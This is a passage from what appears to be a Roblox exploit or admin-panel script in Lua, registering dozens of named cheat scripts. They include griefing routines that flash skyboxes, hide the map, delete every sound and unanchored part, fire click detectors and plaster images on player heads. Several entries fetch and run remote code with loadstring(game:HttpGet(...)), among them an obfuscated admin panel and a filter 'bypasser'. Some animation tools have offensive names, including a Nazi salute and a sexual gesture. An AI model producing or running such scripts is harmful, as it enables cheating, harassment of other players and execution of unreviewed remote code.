function addbill()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			makebill(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			makebill(newDescendant)
		end
	end)
end

addbill()
]], "CS / SS")

cscript("manon sky", [[
local imageOne   = "http://www.roblox.com/asset/?id=101237382805423"
local imageTwo   = "http://www.roblox.com/asset/?id=89208523637949"
local imageThree = "http://www.roblox.com/asset/?id=71661000559292"
local imageFour  = "http://www.roblox.com/asset/?id=90561155276969"
local imageFive  = "http://www.roblox.com/asset/?id=94754770398224"
local imageSix   = "http://www.roblox.com/asset/?id=139866687601719"
local imageSeven = "http://www.roblox.com/asset/?id=73504679034131"
local imageEight = "http://www.roblox.com/asset/?id=125003859591663"
local imageNine   = "http://www.roblox.com/asset/?id=133067734889959"
local imageTen = "http://www.roblox.com/asset/?id=93193616917547"
local imageEleven = "http://www.roblox.com/asset/?id=121611382430450"
local imageTwelve   = "http://www.roblox.com/asset/?id=89967226392530"
local imageThirteen = "http://www.roblox.com/asset/?id=126583685682788"
local imageFourteen = "http://www.roblox.com/asset/?id=94213248040489"

local Sky = Instance.new("Sky", game.Lighting)

local function setSkybox(image)
	Sky.SkyboxBk = image
	Sky.SkyboxDn = image
	Sky.SkyboxFt = image
	Sky.SkyboxLf = image
	Sky.SkyboxRt = image
	Sky.SkyboxUp = image
end

local images = {
	imageOne,
	imageTwo,
	imageThree,
	imageFour,
	imageFive,
	imageSix,
	imageSeven,
	imageEight,
	imageNine,
	imageTen,
	imageEleven,
	imageTwelve,
	imageThirteen,
	imageFourteen
}

spawn(function()
	while true do
		for _, image in ipairs(images) do
			setSkybox(image)
			wait(0.1)
		end
	end
end)
]], "CS / SS")

cscript("hide workspace but players", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function char(instance)
	for _, player in pairs(Players:GetPlayers()) do
		local char = player.Character
		if char and (instance == char or instance:IsDescendantOf(char)) then
			return true
		end
	end
	return false
end

function hide()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if not char(obj) then
			if obj:IsA("BasePart") then
				obj.Transparency = 1
			elseif obj:IsA("Decal") or obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
				obj.Transparency = 1
			elseif obj:IsA("Highlight") then
				obj.Transparency = 1
			end
		end
	end
end

wait()
hide()
]], "CS / SS")

cscript("roblox icons message", [[
local function createScrollingText(text, originalObject)
	if not originalObject:IsA("Message") then return end

	local targetParent = originalObject.Parent
	local targetName = originalObject.Name

	local function createNewMessage()
		local newMessage = Instance.new("Message")
		newMessage.Name = targetName
		newMessage.Parent = targetParent

		local scrollControl = Instance.new("BoolValue")
		scrollControl.Name = "ScrollControl"
		scrollControl.Value = true
		scrollControl.Parent = newMessage

		local lines = {}
		for line in text:gmatch("([^\n]+)") do
			table.insert(lines, "" .. line .. "")
		end

		coroutine.wrap(function()
			local positions = {}
			for i = 1, #lines do
				positions[i] = 1
			end

			while scrollControl.Parent == newMessage and scrollControl.Value do
				local displayText = ""

				for i, line in ipairs(lines) do
					local lineLength = #line
					local pos = positions[i]

					local displayLine = line:sub(pos, pos + lineLength - 4)

					if #displayLine < lineLength - 3 then
						displayLine = displayLine .. line:sub(1, lineLength - 3 - #displayLine)
					end

					positions[i] = pos + 1
					if positions[i] > lineLength then
						positions[i] = 1
					end

					displayText = displayText .. displayLine
					if i < #lines then
						displayText = displayText .. "\n"
					end
				end

				newMessage.Text = displayText
				task.wait(0.15)
			end

			if scrollControl.Parent == newMessage then
				scrollControl:Destroy()
			end
		end)()

		return newMessage
	end

	local currentMessage = createNewMessage()

	coroutine.wrap(function()
		while true do
			task.wait(1)

			if not currentMessage or not currentMessage.Parent then
				currentMessage = createNewMessage()
			end

			for _, sound in pairs(game:GetDescendants()) do
				if sound:IsA("Sound") and sound.Name ~= "dontdeleteme" and sound.Name ~= "canttouchthis" then
					sound:Destroy()
				end
			end

			for _, message in pairs(game:GetDescendants()) do
				if message:IsA("Sound") and message.Name ~= "yuhh" then
					message:Destroy()
				end
			end

			for _, hint in pairs(game:GetDescendants()) do
				if hint:IsA("Sound") then
					hint:Destroy()
				end
			end

			local Lighting = game:GetService("Lighting")
			local Camera = game:GetService("Workspace").CurrentCamera

			local defaultValues = {
				Brightness = 2,
				Ambient = Color3.new(0.5, 0.5, 0.5),
				ColorShift_Bottom = Color3.new(0, 0, 0),
				ColorShift_Top = Color3.new(0, 0, 0),
				OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
				ClockTime = 14,
				FogColor = Color3.new(1, 1, 1),
				FogEnd = 10000000000,
				FogStart = 0,
				GeographicLatitude = 41.733,
				GlobalShadows = true,
				ExposureCompensation = 0,
				EnvironmentDiffuseScale = 1,
				EnvironmentSpecularScale = 1,
				ShadowSoftness = 0.2,
				Technology = Enum.Technology.Compatibility,
			}

			local function restoreLightingEffects()
				for _, effect in ipairs(Lighting:GetChildren()) do
					if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or 
						effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("MotionBlurEffect") then
						effect:Destroy()
					end
				end
			end

			local function restoreCameraEffects()
				Camera.FieldOfView = 70
				Camera.CameraSubject = nil
				Camera.CameraType = Enum.CameraType.Custom
				for _, obj in ipairs(Camera:GetChildren()) do
					if obj:IsA("Script") or obj:IsA("LocalScript") then
						obj:Destroy()
					end
				end
			end

			task.spawn(function()
				for property, value in pairs(defaultValues) do
					pcall(function()
						Lighting[property] = value
					end)
				end

				restoreLightingEffects()
				restoreCameraEffects()
			end)
		end
	end)()

	return currentMessage
end

local bro = Instance.new("Message", workspace)
bro.Name = "yuhh"

local function grs(l)
	local chars = {"", "", ""}
	local result = ""
	for i = 1, l do
		local rndi = math.random(1, #chars)
		result = result .. chars[rndi]
	end
	return result
end

local messageText = table.concat({
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
	grs(100),
}, "\n")

createScrollingText(messageText, bro)
]], "CS / SS")

cscript("questionable billboards", [[
local imgs = {
	"http://www.roblox.com/asset/?id=121611601219308",
	"http://www.roblox.com/asset/?id=96924098486679",
	"http://www.roblox.com/asset/?id=103477226772653",
	"http://www.roblox.com/asset/?id=130687509173596",
	"http://www.roblox.com/asset/?id=102426484545843",
	
	"http://www.roblox.com/asset/?id=102426484545843",
	"http://www.roblox.com/asset/?id=130687509173596",
	"http://www.roblox.com/asset/?id=103477226772653",
	"http://www.roblox.com/asset/?id=96924098486679",
	"http://www.roblox.com/asset/?id=121611601219308",
	"http://www.roblox.com/asset/?id=121611601219308",
}

local BILLBOARD_NAME = "AnimatedBillboard"

function makebill(part)
	if part:FindFirstChild(BILLBOARD_NAME) then return end

	local bill = Instance.new("BillboardGui")
	bill.Name = BILLBOARD_NAME
	bill.Size = UDim2.new(3, 0, 3, 0)
	bill.AlwaysOnTop = true
	bill.Adornee = part
	bill.Parent = part

	local imageLabels = {}

	for i, imgUrl in ipairs(imgs) do
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.BackgroundTransparency = 1
		imageLabel.Image = imgUrl
		imageLabel.Visible = false
		imageLabel.Parent = bill
		table.insert(imageLabels, imageLabel)
	end

	task.spawn(function()
		local index = 1
		while bill and bill.Parent do
			for i, label in ipairs(imageLabels) do
				label.Visible = (i == index)
			end
			index = (index % #imageLabels) + 1
			task.wait(0.1)
		end
	end)
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbill()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			makebill(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			makebill(newDescendant)
		end
	end)
end

addbill()
]], "CS / SS")

cscript("gear giver", [[ 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/gear%20giver.lua"))()
]], "LS")

cscript("loop destroy unanchored", [[
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local Players = game:GetService("Players")

local function isDescendantOfPlayerCharacter(part)
	for _, player in ipairs(Players:GetPlayers()) do
		local character = player.Character
		if character and part:IsDescendantOf(character) then
			return true
		end
	end
	return false
end

local function deleteUnanchoredParts()
	while true do
		task.wait(0)

		local unanchoredParts = {}
		for _, part in ipairs(workspace:GetDescendants()) do
			if part:IsA("BasePart") and not part.Anchored and part.Parent ~= nil then
				if not isDescendantOfPlayerCharacter(part) then
					table.insert(unanchoredParts, part)
				end
			end
		end

		for _, part in ipairs(unanchoredParts) do
			Debris:AddItem(part, 0)
		end
	end
end

coroutine.wrap(deleteUnanchoredParts)()
]], "CS / SS")

cscript("betterbypasser", [[ 
        loadstring(game:HttpGet("https://github.com/Synergy-Networks/products/raw/main/BetterBypasser/loader.lua"))()
]], "LS")

cscript("NDS launch rocket", [[
for _, model in ipairs(workspace:FindFirstChild("Structure"):GetChildren()) do
	if model:IsA("Model") then
		for _, descendant in ipairs(model:GetDescendants()) do
			if descendant:IsA("ClickDetector") and descendant.Parent then
				fireclickdetector(descendant, 0)
			end
		end
	end
end
]], "CS / SS")

cscript("nullfire", [[ 
loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
]], "LS")

cscript("black hole", [[ 
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
]], "LS")

cscript("anti fall damage", [[
local rs = game:GetService("RunService")
local hb = rs.Heartbeat
local rsd = rs.RenderStepped
local lp = game.Players.LocalPlayer
local z = Vector3.zero
local function f(c)
    local r = c:WaitForChild("HumanoidRootPart")
    if r then
        local con
        con = hb:Connect(function()
            if not r.Parent then
                con:Disconnect()
            end
            local v = r.AssemblyLinearVelocity
            r.AssemblyLinearVelocity = z
            rsd:Wait()
            r.AssemblyLinearVelocity = v
        end)
    end
end
f(lp.Character)
lp.CharacterAdded:Connect(f)
]], "CS / SS")

cscript("crawl tool", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "crawler"
local WALK_ANIMATION_ID = "rbxassetid://282574440"
local WALK_SPEED_THRESHOLD = 1

local function createCustomTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false

	tool.Parent = LocalPlayer:WaitForChild("Backpack")
end

createCustomTool()

local walkAnim = Instance.new("Animation")
walkAnim.AnimationId = WALK_ANIMATION_ID

local currentTrack = nil
local animator = nil
local equipped = false
local humanoid = nil

local function stopTrack()
	if currentTrack then
		currentTrack:Stop()
		currentTrack = nil
	end
end

local function startTrack()
	if animator and not currentTrack then
		currentTrack = animator:LoadAnimation(walkAnim)
		currentTrack.Priority = Enum.AnimationPriority.Movement
		currentTrack.Looped = true
		currentTrack:Play()
	end
end

local function setupTool(tool)
	if tool:IsA("Tool") and tool.Name == TOOL_NAME then
		tool.Equipped:Connect(function()
			equipped = true
		end)
		tool.Unequipped:Connect(function()
			equipped = false
			stopTrack()
		end)
	end
end

local function onCharacterAdded(char)
	humanoid = char:WaitForChild("Humanoid")
	local hrp = char:WaitForChild("HumanoidRootPart")

	animator = humanoid:FindFirstChildWhichIsA("Animator")
	if not animator then
		animator = Instance.new("Animator")
		animator.Parent = humanoid
	end

	for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
		setupTool(tool)
	end
	for _, item in ipairs(char:GetChildren()) do
		if item:IsA("Tool") then
			setupTool(item)
		end
	end

	LocalPlayer.Backpack.ChildAdded:Connect(setupTool)
	char.ChildAdded:Connect(setupTool)

	RunService.Heartbeat:Connect(function()
		if not equipped or not humanoid or not hrp then
			stopTrack()
			return
		end

		local velocity = hrp.Velocity
		local speed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude

		if speed > WALK_SPEED_THRESHOLD then
			startTrack()
		else
			stopTrack()
		end
	end)
end

if LocalPlayer.Character then
	onCharacterAdded(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
]], "CS / SS")

cscript("jerk off tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "jerk off"
local ANIMATION_ID = "rbxassetid://72042024"
local ANIMATION_ID2 = "rbxassetid://168268306"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local animTrack2 = nil
	local loopConnection = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID
	local animation2 = Instance.new("Animation")
	animation2.AnimationId = ANIMATION_ID2

	tool.Equipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end

		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack.Looped = false
		animTrack:Play()
		animTrack.TimePosition = 0.4
        animTrack:AdjustSpeed(0.8)
        
        animTrack2 = animator:LoadAnimation(animation2)
        animTrack.Priority = Enum.AnimationPriority.Action
        animTrack2:Play()
        animTrack2.TimePosition = 1
        animTrack2:AdjustSpeed(0)

		loopConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if animTrack and animTrack.Length > 0 and animTrack.TimePosition >= animTrack.Length then
				animTrack:Play()
				animTrack.TimePosition = 0.4
        animTrack:AdjustSpeed(0.8)
			end
		end)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
		if animTrack2 then
			animTrack2:Stop()
			animTrack2 = nil
		end
		if loopConnection then
			loopConnection:Disconnect()
			loopConnection = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("hitler salute tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "austrian salute"
local ANIMATION_ID = "rbxassetid://176236333"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    task.wait(0.1)
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("dab tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "dab"
local ANIMATION_ID = "rbxassetid://248263260"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("arm helicopter tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "arm helicopter"
local ANIMATION_ID = "rbxassetid://259438880"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(999)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("lay down tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "lay down"
local ANIMATION_ID = "rbxassetid://181526230"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("t pose tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "t pose"
local ANIMATION_ID = "rbxassetid://188242481"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("hands up tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "hands up"
local ANIMATION_ID = "rbxassetid://187951261"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("dance tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "dance"

local ANIMATIONS = {
    "rbxassetid://161099825",
    "rbxassetid://27789359",
    "rbxassetid://248263260",
    "rbxassetid://182435998",
    "rbxassetid://52155014",
    "rbxassetid://28488254",
    "rbxassetid://35634514",
    "rbxassetid://35654637",
    "rbxassetid://45834924",
    "rbxassetid://429703734",
    "rbxassetid://466755434",
    "rbxassetid://429730430",
    "rbxassetid://30196114",
    "rbxassetid://33796059",
    "rbxassetid://45834924",
    "rbxassetid://182491277",
    "rbxassetid://182491368",
}

local function giveTool()
    if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

    local tool = Instance.new("Tool")
    tool.Name = TOOL_NAME
    tool.RequiresHandle = false
    tool.CanBeDropped = false
    tool.Parent = LocalPlayer:WaitForChild("Backpack")

    return tool
end

local function setupTool(tool)
    local animTrack = nil
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

    local function getRandomAnimation()
        local randomIndex = math.random(1, #ANIMATIONS)
        local animation = Instance.new("Animation")
        animation.AnimationId = ANIMATIONS[randomIndex]
        return animation
    end

    tool.Equipped:Connect(function()
        if animTrack then animTrack:Stop() end
        local animation = getRandomAnimation()
        animTrack = animator:LoadAnimation(animation)
        animTrack.Priority = Enum.AnimationPriority.Action
        animTrack:Play()
        animTrack.Looped = true
        animTrack:AdjustWeight(999)
    end)

    tool.Unequipped:Connect(function()
        if animTrack then
            animTrack:Stop()
            animTrack = nil
        end
    end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("the charleston tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "the charleston"
local ANIMATION_ID = "rbxassetid://429703734"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("kneel down tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "kneel down"
local ANIMATION_ID = "rbxassetid://287325678"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("cradle tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "cradle"
local ANIMATION_ID = "rbxassetid://180612465"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
    animTrack.TimePosition = 0.6
		animTrack:AdjustSpeed(0)
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("jumping jacks tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "jumping jacks"
local ANIMATION_ID = "rbxassetid://429681631"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("frantic tool", [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TOOL_NAME = "frantic"
local ANIMATION_ID = "rbxassetid://73137648"

local function giveTool()
	if LocalPlayer:FindFirstChildOfClass("Backpack"):FindFirstChild(TOOL_NAME) then return end

	local tool = Instance.new("Tool")
	tool.Name = TOOL_NAME
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.Parent = LocalPlayer:WaitForChild("Backpack")

	return tool
end

local function setupTool(tool)
	local animTrack = nil
	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local humanoid = character:WaitForChild("Humanoid")
	local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)

	local animation = Instance.new("Animation")
	animation.AnimationId = ANIMATION_ID

	tool.Equipped:Connect(function()
		if animTrack then animTrack:Stop() end
		animTrack = animator:LoadAnimation(animation)
		animTrack.Priority = Enum.AnimationPriority.Action
		animTrack:Play()
	end)

	tool.Unequipped:Connect(function()
		if animTrack then
			animTrack:Stop()
			animTrack = nil
		end
	end)
end

local tool = giveTool()
setupTool(tool)
]], "CS / SS")

cscript("shocked tool", [[
